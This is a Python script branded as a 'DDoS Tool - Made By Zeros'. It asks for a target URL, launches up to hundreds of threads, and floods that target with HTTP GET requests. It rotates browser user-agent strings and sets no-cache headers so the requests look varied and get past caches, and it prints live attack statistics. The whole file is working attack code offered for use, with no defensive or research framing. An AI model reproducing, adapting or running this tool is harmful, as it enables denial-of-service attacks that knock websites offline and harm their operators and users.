# filename: ddos_tool_zeros.py

import requests
import threading
import random
import time
import sys
from urllib.parse import urlparse

# --- Configuration ---
DEFAULT_THREADS = 100
DEFAULT_REQUESTS_PER_THREAD = 1000
TIMEOUT = 5  # seconds for request timeout

# --- User Agents for Rotation ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.49",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.49",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 OPR/96.0.0.0",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.65 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.65 Mobile Safari/537.36",
]

# --- Global Counters ---
successful_requests = 0
failed_requests = 0
total_requests_sent = 0
attack_active = True
lock = threading.Lock()

# --- Attack Function ---
def ddos_attack(target_url, requests_to_send, thread_id):
    global successful_requests, failed_requests, total_requests_sent, attack_active

    session = requests.Session() # Use a session for potential connection pooling
    
    for i in range(requests_to_send):
        if not attack_active:
            break

        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }

        try:
            response = session.get(target_url, headers=headers, timeout=TIMEOUT)
            with lock:
                total_requests_sent += 1
                if response.status_code < 400: # Considering 2xx and 3xx as successful
                    successful_requests += 1
                else:
                    failed_requests += 1
            # Optional: Print verbose output for each request (can be very noisy)
            # print(f"[Thread-{thread_id}] Request {i+1}/{requests_to_send} to {target_url} - Status: {response.status_code}")
        except requests.exceptions.Timeout:
            with lock:
                total_requests_sent += 1
                failed_requests += 1
            # print(f"[Thread-{thread_id}] Request {i+1}/{requests_to_send} to {target_url} - Timeout!", file=sys.stderr)
        except requests.exceptions.ConnectionError:
            with lock:
                total_requests_sent += 1
                failed_requests += 1
            # print(f"[Thread-{thread_id}] Request {i+1}/{requests_to_send} to {target_url} - Connection Error!", file=sys.stderr)
        except Exception as e:
            with lock:
                total_requests_sent += 1
                failed_requests += 1
            # print(f"[Thread-{thread_id}] Request {i+1}/{requests_to_send} to {target_url} - Unexpected Error: {e}", file=sys.stderr)

    # print(f"[Thread-{thread_id}] Finished its requests.", file=sys.stderr)

# --- GUI-like Display and Main Logic ---
def main():
    global attack_active

    # --- Banner ---
    print(r"""
    __________                     ________       .___            
\____    /______  ____  ______ \______ \    __| _/____  ______
  /     /\_  __ \/  _ \/  ___/  |    |  \  / __ |/  _ \/  ___/
 /     /_ |  | \(  <_> )___ \   |    `   \/ /_/ (  <_> )___ \ 
/_______ \|__|   \____/____  > /_______  /\____ |\____/____  >
        \/                 \/          \/      \/          \/ 
                                          
    """)
    print("        [+] DDoS Tool - Made By Zeros [+]\n")
    print("--------------------------------------------------")

    # --- User Input ---
    target_url = input("  [>] Enter target URL (e.g., http://example.com): ")
    if not target_url.strip():
        print("  [!] Target URL cannot be empty. Exiting.")
        return

    # Basic URL validation and scheme addition
    if not urlparse(target_url).scheme:
        target_url = "http://" + target_url
    
    # Optional: Resolve IP if user enters domain
    # import socket
    # try:
    #     hostname = urlparse(target_url).hostname
    #     ip_address = socket.gethostbyname(hostname)
    #     print(f"  [i] Resolved {hostname} to IP: {ip_address}")
    # except socket.gaierror:
    #     print(f"  [!] Could not resolve hostname for {target_url}. Continuing with URL.")

    try:
        num_threads = int(input(f"  [>] Enter number of threads (default: {DEFAULT_THREADS}): ") or DEFAULT_THREADS)
        if num_threads <= 0:
            raise ValueError
    except ValueError:
        print("  [!] Invalid number of threads. Using default.")
        num_threads = DEFAULT_THREADS

    try:
        requests_per_thread = int(input(f"  [>] Enter requests per thread (default: {DEFAULT_REQUESTS_PER_THREAD}): ") or DEFAULT_REQUESTS_PER_THREAD)
        if requests_per_thread <= 0:
            raise ValueError
    except ValueError:
        print("  [!] Invalid requests per thread. Using default.")
        requests_per_thread = DEFAULT_REQUESTS_PER_THREAD

    print("\n--------------------------------------------------")
    print(f"  [+] Target: {target_url}")
    print(f"  [+] Threads: {num_threads}")
    print(f"  [+] Requests per thread: {requests_per_thread}")
    print("--------------------------------------------------\n")

    confirm = input("  [?] Press 'Y' to start attack, or any other key to exit: ").strip().lower()
    if confirm != 'y':
        print("  [!] Attack cancelled. Exiting.")
        return

    print("\n  [+] Initiating DDoS attack...\n")
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=ddos_attack, args=(target_url, requests_per_thread, i + 1))
        threads.append(thread)
        thread.daemon = True # Allows main program to exit even if threads are still running
        thread.start()

    # --- Attack Monitoring ---
    start_time = time.time()
    try:
        while threading.active_count() > 1: # Wait for all attack threads to finish
            elapsed_time = time.time() - start_time
            with lock:
                sys.stdout.write(f"\r  [>>] Attack Status: Active | Sent: {total_requests_sent} | Success: {successful_requests} | Failed: {failed_requests} | Time: {elapsed_time:.2f}s")
                sys.stdout.flush()
            time.sleep(1) # Update every second
        
        # Final update after all threads complete
        elapsed_time = time.time() - start_time
        sys.stdout.write(f"\r  [>>] Attack Status: Complete | Sent: {total_requests_sent} | Success: {successful_requests} | Failed: {failed_requests} | Time: {elapsed_time:.2f}s\n")
        sys.stdout.flush()

    except KeyboardInterrupt:
        print("\n  [!] Attack interrupted by user. Stopping threads...")
        attack_active = False # Signal threads to stop
        # Give a moment for threads to acknowledge the stop signal
        time.sleep(2) 
        print("  [!] Exiting.")

    print("\n\n--------------------------------------------------")
    print("  [+] Attack Summary:")
    print(f"  Total Requests Sent: {total_requests_sent}")
    print(f"  Successful Requests: {successful_requests}")
    print(f"  Failed Requests:   {failed_requests}")
    print(f"  Total Duration:    {time.time() - start_time:.2f} seconds")
    print("--------------------------------------------------")
    print("  [+] DDoS Tool - Made By Zeros [+]")
    print("--------------------------------------------------")

if __name__ == "__main__":
    main()
